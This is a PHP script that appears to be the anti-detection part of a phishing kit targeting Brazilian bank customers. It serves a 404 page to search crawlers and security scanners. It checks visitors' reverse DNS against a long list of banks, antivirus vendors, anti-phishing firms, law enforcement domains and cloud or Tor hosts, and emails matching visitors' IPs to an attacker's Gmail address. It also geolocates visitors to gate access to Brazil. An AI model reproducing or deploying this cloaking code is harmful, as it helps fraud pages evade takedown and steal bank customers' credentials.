<?php
ob_start();
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Google", "GoogleBot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "Acunetix", "wwwroot", "crossdomain");
	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found');
	exit;
	}
}
$uri = $_SERVER["REQUEST_URI"];
$ipserver = $_SERVER["SERVER_ADDR"];
$resuelveserver = gethostbyaddr($ipserver);
//$e500 = '<script language="javascript">window.location.replace("https://www.google.com/");</script>';
$ipx = getenv("REMOTE_ADDR");
$host = gethostbyaddr($ipx);
$banhosts = array("bradesco","pish","santander", "scotiabank", "google-bot", "google-proxy", "googleproxy", "netcraft.com",
"ebay.com", "panda.com","microsoft.com", "fbi.gov", "msn.com","yahoo.com", "cia.gov", "bankofamerica", "viabcp", "veritas",
"nod32","antipishing","kapersky", "norton", "symantec","rsasecurity", "bancopopular", "paypal", "unicaja", "movistar", ".spfbl.",
"banesto", "cajamadrid", "bancopastor", "rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign", "prcdn",
"markmonitor", "pandasoftware", "delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus", "above", "dreamhost",
"nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft", "pool.",
"bitdefender-es", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset", "google",
"symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector", "letti", "itau", "189.9.20.",
"santander", "dufrio", "mx.", "bb.com.br", "phish", "amazon", "cloud", "scaleway", "reverse", ".tor.", "tor-exit", "linode", "dimenoc");

$x = count($banhosts);


//email que irá receber alerta de acessos suspeitos dos hosts acima
$m = "inflost@gmail.com";

for ($y = 0; $y < $x; $y++) {
   if (strpos($host ,$banhosts[$y])== true) {
	@mail($m, $banhosts[$y],$ipx . ' - ' . $host . ' - ' . $uri);
	// echo $e500;
	// exit;
   } 
}

$data = date("d-M-Y-H-i-s");
$ip = $_SERVER['REMOTE_ADDR'];
$acessoip    = $_SERVER['REMOTE_ADDR'];
$details     = json_decode(file_get_contents("http://ipinfo.io/{$acessoip}/json"));
$pais 		 = $details->country;
if ($pais != 'BR') {
	// echo $e500;
	// exit();
}
?>